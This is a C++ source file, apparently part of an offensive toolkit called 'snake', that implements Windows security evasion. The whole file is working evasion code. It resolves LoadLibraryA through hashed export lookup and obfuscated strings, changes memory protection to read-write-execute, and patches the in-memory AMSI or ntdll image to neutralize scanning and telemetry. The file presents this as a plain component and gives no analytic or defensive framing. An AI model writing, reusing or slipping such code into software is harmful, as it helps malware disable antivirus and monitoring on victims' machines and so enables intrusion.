#include "snake/evade.hpp"

#ifdef _WIN32

#include <cstdint>

namespace snake {
namespace evade {

namespace {

constexpr unsigned long kPageExecuteReadWrite = 0x40;

winstealth::Module module_for(Target t) {
    return t == Target::amsi ? winstealth::Module::amsi : winstealth::Module::ntdll;
}

void* kernel32_export(const std::string& name) {
    const winstealth::ImageView img = winstealth::loaded_module(winstealth::Module::kernel32);
    if (!img.ok()) return nullptr;
    const std::uint32_t rva = winstealth::pe_export_rva(img, winstealth::fnv1a_ascii(name));
    if (rva == 0 || rva >= img.size) return nullptr;
    return const_cast<std::uint8_t*>(img.base) + rva;
}

void page_window(const void* addr, std::size_t len, unsigned long page, std::uintptr_t& start,
                 std::uintptr_t& end) {
    if (page == 0) page = 4096;
    const std::uintptr_t base = reinterpret_cast<std::uintptr_t>(addr);
    start = base - (base % page);
    end = ((base + len + page - 1) / page) * page;
    if (end <= base) end = base + len;
}

}  // namespace

bool neutralize(Target t) {
    const TargetSpec spec = target_spec(t);
    winstealth::ImageView img = winstealth::loaded_module(module_for(t));
    if (!img.ok()) {
        using LoadLibraryA_fn = void* (*)(const char*);
        auto* load_library =
            reinterpret_cast<LoadLibraryA_fn>(kernel32_export(SNAKE_OBF("LoadLibraryA")));
        if (!load_library) return false;
        load_library(spec.module.c_str());
        img = winstealth::loaded_module(module_for(t));
        if (!img.ok()) return false;
    }

    const PatchSite site = locate(img, t);
    if (!site.found) return false;
    if (image_patched(img.base, img.size, site, t)) return true;

    std::uint8_t* target = const_cast<std::uint8_t*>(img.base) + site.rva;
    std::uintptr_t start = 0, end = 0;
    page_window(target, spec.patch_len, winstealth::system_page_size(), start, end);
    unsigned long old = 0;
    if (!winstealth::virtual_protect(reinterpret_cast<void*>(start), end - start,
                                     kPageExecuteReadWrite, old)) {
        return false;
    }
    const bool ok = patch_image(const_cast<std::uint8_t*>(img.base), img.size, site, t);
    unsigned long ignored = 0;
    winstealth::virtual_protect(reinterpret_cast<void*>(start), end - start, old, ignored);
    return ok;
}

std::size_t apply(const EvadePolicy& policy) {
    std::size_t done = 0;
    for (std::size_t i = 0; i < static_cast<std::size_t>(Target::Count); ++i) {
        const Target t = static_cast<Target>(i);
        if (!policy.enabled(t)) continue;
        if (neutralize(t)) ++done;
    }
    return done;
}

}  // namespace evade
}  // namespace snake

#else  // !_WIN32

#endif  // _WIN32
